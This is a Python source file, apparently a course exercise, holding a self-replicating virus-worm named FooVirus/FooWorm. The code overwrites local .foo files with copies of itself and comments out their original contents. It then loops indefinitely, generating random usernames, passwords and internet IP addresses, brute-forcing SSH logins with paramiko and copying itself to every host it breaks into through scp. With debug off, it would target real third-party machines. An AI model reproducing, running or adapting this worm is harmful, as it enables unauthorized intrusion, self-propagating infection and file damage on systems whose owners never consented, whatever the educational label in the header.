#!/usr/bin/env python
import glob, paramiko, scp, sys, signal, os, random
##   FooVirus.py
##   Author: Avi kak (kak@purdue.edu)
##   Date:   April 5, 2016; Updated April 6, 2022

##   Edited by: Md. Asif Haider (1805112@ugrad.cse.buet.ac.bd)
##   Date:  August 3, 2023

# print("""\nHELLO FROM FooVirus\n\n
# This is a demonstration of how easy it is to write
# a self-replicating program. This virus will infect
# all files with names ending in .foo in the directory in
# which you execute an infected file.  If you send an
# infected file to someone else and they execute it, their,
# foo files will be damaged also.

# Note that this is a safe virus (for educational purposes
# only) since it does not carry a harmful payload.  All it
# does is to print out this message and comment out the
# code in .foo files.\n\n""")

print("""\nHELLO FROM FooWorm\n""")

def get_total_lines():
    IN = open(sys.argv[0], 'r')
    all_of_it = IN.readlines()
    IN.close()
    return len(all_of_it)

IN = open(sys.argv[0], 'r')
worm = [line for (i,line) in enumerate(IN) if i < get_total_lines()]

for item in glob.glob("*.foo"):
    IN = open(item, 'r')
    all_of_it = IN.readlines()
    IN.close()
    if any('fooworm' in line for line in all_of_it): continue
    os.chmod(item, 0o777)    
    OUT = open(item, 'w')
    OUT.writelines(worm)
    all_of_it = ['# ' + line for line in all_of_it]
    OUT.writelines(all_of_it)
    OUT.close()

# Turning the virus into a worm by incorporating networking code in it like the one in Abraworm.py

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 0

NHOSTS = NUSERNAMES = NPASSWDS = 3

trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['root']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] 
          if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['mypassword']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) 
                if random.random() > 0.5 else '') if int(selector[x]) == 1 
                        else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: 
        target = random.randint(2,11)
        target = '127.17.0' + str(target)
        print("Next IP: %s" % target)
        return [target]   # victim IP address
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses 


while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds =   get_new_passwds(NPASSWDS)
    for passwd in passwds:
        for user in usernames:
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []

                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")

                    scpcon = scp.SCPClient(ssh.get_transport())
                    scpcon.put(sys.argv[0])
                    scpcon.close()
                except:
                    print("\n\nConnection failed\n")
                    continue

    if debug: break
